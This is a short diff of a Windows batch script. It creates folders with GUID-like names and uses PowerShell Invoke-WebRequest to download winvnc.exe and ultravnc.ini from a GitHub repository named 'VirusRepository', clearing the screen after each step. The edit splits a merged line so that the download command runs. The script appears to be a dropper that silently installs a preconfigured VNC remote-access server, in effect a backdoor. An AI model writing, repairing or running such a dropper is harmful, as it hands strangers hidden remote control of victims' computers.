@@ -6,7 +6,8 @@ md {MOEA-WIDJ-9832-3242-LS21-NFD2-MD34}
 cd {BOEA-DIDJ-9832-3242-HA21-NFD2-MD34}
 md {BOEA-DIDJ-9832-3242-HA21-NFD2-MD34}
 cls
-cd {BOEA-WIDJ-9832-3242-HA21-NFD2-MD34}powershell -Command "Invoke-WebRequest https://github.com/ironyumrepos/VirusRepository/raw/main/winvnc.exe -Outfile winvnc.exe"
+cd {BOEA-WIDJ-9832-3242-HA21-NFD2-MD34}
+powershell -Command "Invoke-WebRequest https://github.com/ironyumrepos/VirusRepository/raw/main/winvnc.exe -Outfile winvnc.exe"
 cls
 powershell -Command "Invoke-WebRequest https://github.com/ironyumrepos/VirusRepository/raw/main/ultravnc.ini -Outfile ultravnc.ini"
 cls
